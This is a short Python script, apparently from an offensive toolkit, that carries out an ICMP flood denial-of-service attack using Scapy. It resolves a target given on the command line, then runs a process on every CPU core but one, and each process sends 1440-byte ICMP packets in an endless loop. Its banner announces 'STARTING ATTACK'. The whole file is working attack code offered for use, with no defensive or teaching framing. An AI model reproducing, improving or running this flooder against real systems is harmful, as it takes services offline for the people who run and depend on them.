#!/usr/bin/env python
# -*- coding: utf-8 -*-


import time
import sys
import multiprocessing
from scapy.all import *


def preset(cpu_number): #This method is responsible for starting multiprocessing processes.
	processes = [multiprocessing.Process(target=start_attack, args=()) for i in range(cpu_number)]

	for i in range(cpu_number):
		processes[i].start()
	for i in range(cpu_number):
		processes[i].join()

def start_attack():
	ip_adress = ""
	data = "X"*1440
	if len(sys.argv) < 2:
		print "Please give an ip adress or domain name"
	else:
		try:
			packet = sr1(IP(dst="")/UDP()/DNS(rd=1, qd=DNSQR(qname=sys.argv[1])), verbose=False)
			ip_adress = packet[1][DNSRR].rdata
		except:
			ip_adress = sys.argv[1]
		
		send(IP(dst=ip_adress)/ICMP()/data, verbose=False, loop=1) #If you want to send limited number of packets, remove loop field and add count=<number of packets> field

def main():
	t = round(time.time())

	preset(multiprocessing.cpu_count()-1) #This tool will use all cores of your cpu [except first core], to get maximum effect for this attack. 

	print "\033[96m @MasterPiec3+>\033[31m STARTING ATTACK...\033[39m %s" % (round(time.time() - t))
	sys.exit()


if __name__ == '__main__':

	banner = """\033[96m @MasterPiec3+>\033[31m PRESS CTRL+C TO START AND CTRL+C TO STOP\033[39m """
	print banner
	try:
		t = round(time.time())
		main()
	except:
		print "\033[96m @MasterPiec3+>\033[31m STARTING ATTACK...\033[39m %s" % (round(time.time() - t))
		sys.exit()